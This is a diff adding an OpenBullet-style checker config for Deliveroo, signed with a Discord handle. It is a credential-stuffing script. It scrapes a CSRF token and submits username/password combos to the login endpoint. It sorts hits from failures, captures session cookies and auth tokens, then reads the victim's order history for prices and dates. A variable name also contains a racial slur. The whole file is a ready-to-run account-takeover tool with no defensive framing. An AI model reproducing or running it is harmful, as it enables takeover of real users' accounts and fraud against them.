@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "Deliveroo",
+  "SuggestedBots": 1,
+  "LastModified": "2019-06-04T14:41:26.7616511+01:00",
+  "AdditionalInfo": "",
+  "Author": "TB",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Discord:_tb0084 REQUEST GET "https://deliveroo.co.uk/login?redirect=%2F" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-GB,en-US;q=0.9,en;q=0.8" 
+  HEADER "referer: https://deliveroo.co.uk/" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+#Discord:_tb0084 PARSE "<SOURCE>" LR "\"csrf_token\":\"" "\"" -> VAR "token" 
+#Discord:_tb0084 REQUEST POST "https://deliveroo.co.uk/auth/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-GB,en-US;q=0.9,en;q=0.8" 
+  HEADER "referer: https://deliveroo.co.uk/" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+  HEADER "x-csrf-token: <token>" 
+#Discord:_tb0084 KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "msg\":\"Not authorized" 
+  KEYCHAIN Success OR 
+    KEY "user\":{\"id\":" 
+#Discord:_tb0084 PARSE "<COOKIES(__cfduid)>" LR "" "" -> VAR "uid" 
+#Discord:_tb0084 PARSE "<COOKIES(roo_guid)>" LR "" "" -> VAR "rooguid" 
+#Discord:_tb0084 PARSE "<COOKIES(roo_session_guid)>" LR "" "" -> VAR "sessguid" 
+#Discord:_tb0084 PARSE "<COOKIES(locale)>" LR "" "" -> VAR "local" 
+#Discord:_tb0084 PARSE "<COOKIES(_orderweb_session)>" LR "" "" -> VAR "webses" 
+#Discord:_tb0084 PARSE "<COOKIES(roo_super_properties)>" LR "" "" -> VAR "superprop" 
+#Discord:_tb0084 PARSE "<SOURCE>" LR "api_auth\":\"" "\"" -> VAR "apiauth" 
+#Discord:_tb0084 PARSE "<COOKIES(consumer_auth_token)>" LR "" "" -> VAR "consumerauth" 
+#Discord:_tb0084 PARSE "<COOKIES(roo_sticky_guid)>" LR "" "" -> VAR "roosticky" 
+#Discord:_tb0084 PARSE "<COOKIES(user_data)>" LR "" "" -> VAR "userdatanigga" 
+#Discord:_tb0084 PARSE "<COOKIES(session_data)>" LR "" "" -> VAR "sessydata" 
+#Discord:_tb0084 REQUEST GET "https://deliveroo.co.uk/orders" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-GB,en-US;q=0.9,en;q=0.8" 
+  HEADER "cookie: __cfduid=<uid>; roo_guid=<rooguid>; roo_guid=<rooguid>; roo_session_guid=<sessguid>; locale=<local>; _orderweb_session=<webses>; roo_super_properties=<superprop>; session_data=<sessydata>; consumer_auth_token=<consumerauth>; user_data=<userdatanigga> ; api_auth=<apiauth>; roo_sticky_guid=<roosticky>; ajs_user_id=%224995862%22; ajs_anonymous_id=%22336f5b21-11c1-4ba3-8039-93c3fad42d8c%22; ab.storage.userId.644d616d-41f5-4080-81ea-51df1658efd4=%7B%22g%22%3A%224995862%22%2C%22c%22%3A1556751180439%2C%22l%22%3A1556751180439%7D; ab.storage.sessionId.644d616d-41f5-4080-81ea-51df1658efd4=%7B%22g%22%3A%222366c8be-b41b-5fb4-81f5-f02dcb60dbfd%22%2C%22e%22%3A1556752980465%2C%22c%22%3A1556751180442%2C%22l%22%3A1556751180465%7D" 
+  HEADER "referer: https://deliveroo.co.uk/" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.108 Safari/537.36" 
+#Discord:_tb0084 PARSE "<SOURCE>" LR "\">£ " "<!-- --> " Recursive=TRUE -> CAP "Price" 
+#Discord:_tb0084 PARSE "<SOURCE>" LR "<!-- --> • <!-- -->" "</" Recursive=TRUE -> CAP "Date" 
